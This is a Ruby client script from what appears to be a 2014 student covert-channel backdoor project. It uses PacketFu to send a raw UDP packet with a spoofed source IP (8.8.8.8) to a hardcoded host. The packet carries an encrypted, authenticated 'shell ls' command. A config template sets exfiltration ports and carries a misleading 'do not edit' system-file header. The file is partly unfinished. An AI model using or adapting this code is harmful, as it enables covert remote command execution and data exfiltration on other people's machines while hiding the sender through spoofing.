#!/usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
-- SOURCE FILE:   client.rb - description goes here
--
-- PROGRAM:       client
--                ./client.rb
--
-- FUNCTIONS:     stuff here
--
-- Ruby Gems req: 
-- 
-- DATE:          May/June 2014
--
-- REVISIONS:     See development repo: https://github.com/deuterium/comp8505-final
--
-- DESIGNERS:     Chris Wood - chriswood.ca@gmail.com
--
-- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
-- 
-- NOTES:         notes might go here
---------------------------------------------------------------------------------------
=end

require 'packetfu'
require 'openssl'
require_relative 'util.rb'

## Variables

## Functions

## Application Strings
CONFIG_FILE = "client.conf"
CONFIG_FILE_DEFAULT = "\# This is an important system file! Please do not edit\n"
CONFIG_FILE_DEFAULT << "\# pen_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# pen_port = 8668\n"
CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# exfil_port = 6886\n"
CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"

## Main

IF_DEV = "em1"
config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> IF_DEV)).config
udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")


#udp_pkt.eth_saddr = 
#udp_pkt.eth_daddr = b8:ac:6f:34:ad:d8
udp_pkt.udp_dst = 6886
udp_pkt.udp_src = rand(0xffff)
udp_pkt.ip_saddr = "8.8.8.8"
udp_pkt.ip_daddr = "142.232.107.31"
udp_pkt.payload = encrypt("#{AUTH_STRING} shell ls")
#check that commands have at least 3 split by space, sanitize inputs?
#udp_pkt.payload = "hello this is a test"
puts udp_pkt.payload.length

udp_pkt.recalc
udp_pkt.to_w IF_DEV